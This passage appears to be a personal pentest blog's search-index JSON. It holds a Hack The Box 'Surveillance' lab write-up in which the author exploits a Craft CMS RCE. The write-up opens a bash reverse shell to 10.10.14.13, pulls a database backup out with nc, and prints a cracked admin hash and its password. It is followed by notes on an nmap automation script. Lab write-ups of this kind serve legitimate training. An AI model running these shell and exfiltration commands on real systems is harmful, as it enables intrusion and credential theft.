SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk= | 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://surveillance.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 21 14:48:57 2024 -- 1 IP address (1 host up) scanned in 57.52 seconds\rThe scan reveals SSH on port 22 and a web server (nginx) on port 80. The HTTP service redirects to http://surveillance.htb/, so let’s add this to our /etc/hosts:\necho \"10.10.11.245 surveillance.htb\" | sudo tee -a /etc/hosts\rNext, we use whatweb to gather more details about the web service:\nwhatweb surveillance.htb\rBy checking the result of whatweb I can see from the begginning that we will be dealing with a Content Management System (CMS), being more specific in this case we’ll be dealing with Craft CMS\nFootHold\rVisiting the website on port 80, we identify the CMS version and discover a known vulnerability, (CVE-2023-41892), which affects Craft CMS versions between 4.0.0-RC1 and 4.4.14. This vulnerability allows for unauthenticated remote code execution (RCE).\nThe vulnerability lies in how Craft CMS handles functionalities like \\GuzzleHttp\\Psr7\\FnStream which allows for selective method invocation. An attacker can craft a specially crafted request that triggers this functionality and injects malicious code. This code could then be written to the system’s log file. Since Craft CMS parses the log files for certain purposes, the injected code can be executed unintentionally. This grants the attacker remote code execution capabilities. We find a working exploit on GitHub.:\npython3 craft-cms.py http://surveillance.htb/\rExecuting this exploit grants us shell access as www-data.\nIn order to stabilize the shell, I execute:\nbash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.13/443 0\u003e\u00261'\rPrivilege Escalation to Matthew\rWhile enumerating the system we can see two users (other than root) Matthew \u0026 ZoneMinder. After looking around I found a backup directory containing a zip file which is contains SQL backup file:\nPath: /var/www/html/craft/storage/backups We transfer the file to our machine for inspection: while enumerating the system With our current user (www-data) I found a backup directory that contains a zip file which was interesting.\nI send the file to my machine to inspect it.\nOn receiving machine: nc -nlvp 443 \u003e surv.zip On Sender Machine: nc 10.10.14.13 443 \u003c surveillance--2023-10-17-202801--v4.4.14.sql.zip\rAfter reading the file you can see that it is creating some DB (creating tables and inserting data) and almost at the end you can find the data being inserted to user table\nFrom the picture above I am able to see that matthew is admin (somewhere) and I can see a long string that could be an encrypted password. To crack the hash I did it with crackstation:\n39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec I am able to get a password match! –\u003e starcraft122490"},"title":"Survellance - Hack The Box"},"/pentest-notes/":{"data":{"":"","comming-soon#Comming Soon!":"\r⚠️\rPlease be patient, work In progress\rI the following page you will find a library of tips and tricks in the hacking world."},"title":"Pentesting Notes"},"/pentest-notes/projects/":{"data":{"":"\rInitHACK: Automate Pentesting Folder Setup and Nmap Scans.\rThis Python script streamlines the initial setup for penetration testing by automating folder creation and Nmap scan configuration. It saves you time by handling repetitive tasks, allowing you to focus on the actual testing process.\nContinue to InitHACK.py "},"title":"Projects"},"/pentest-notes/projects/inithack/":{"data":{"":"This Python script streamlines the initial setup for penetration testing by automating folder creation and Nmap scan configuration. It saves you time by handling repetitive tasks, allowing you to focus on the actual testing process.","features#Features":" Check the target’s OS (Linux/Windows). Create testing environment folders (Content, Exploits \u0026 Nmap), with the ability to create more folders if specified. Perform an Nmap scan to find open ports. Perform a full Nmap scan on the specified ports. ","getting-started#Getting Started":"Clone the repository:\ngit clone https://github.com/W1nz4c4r/initHACK.git cd initHACK","pre-requisites#Pre-requisites":"Ensure you have the following Python libraries installed:\nsys subprocess re art signal ipaddress termcolor You can install the required libraries using pip: pip install art termcolor","usage#Usage":"Run the script\npython3 /opt/initHACK.py Option 1: Scan the target for OS\rThis will ping the target machine. Based on the TTL response, the script will determine the target’s OS.\nOptions 2: Create Directories\rThis will create the working directories commonly used in a pentest, with the possibility of creating extra directories if needed. The directories created will be:\nnmap content exploits Option 3: Scan for open ports\rThis option will perform an Nmap scan looking for the open ports on the specified target.\nsudo nmap -p- --open -sS -vvv -n -Pn 10.10.11.13 -oN nmap/OP_ports\r-p- –\u003e scan entire range of ports –open –\u003e Only show open (or possibly open) ports -sS –\u003e TCP SYN scan -vvv –\u003e verbosity level -n –\u003e Never do DNS resolution -Pn –\u003e skip host discovery -oN –\u003e normal output Option 4: Perform a full scan on the target\rThis option will perform a full scan over the open ports previously found.\nsudo nmap -sS -sV -sC -p22,80,8000 -Pn -n -vvv 10.10.11.13 -oA nmap/allPorts\r-sS: TCP SYN scan -sV: Version detection -sC: Run default scripts -p: Ports to scan -Pn: Skip host discovery -n: Never do DNS resolution -vvv: Verbosity level -oA: Output in three major formats *Credits: Inspired by s4vitar’s work. I just wanted to make a more presonalized version that fits more to how im used to work. Please, Feel free to reach out if you have any questions or suggestions for improvement!"},"title":"InitHACK: Automate Pentesting Folder Setup and Nmap Scans."},"/pentest-notes/windows/":{"data":{"":"rwerwe"},"title":"Windows"}}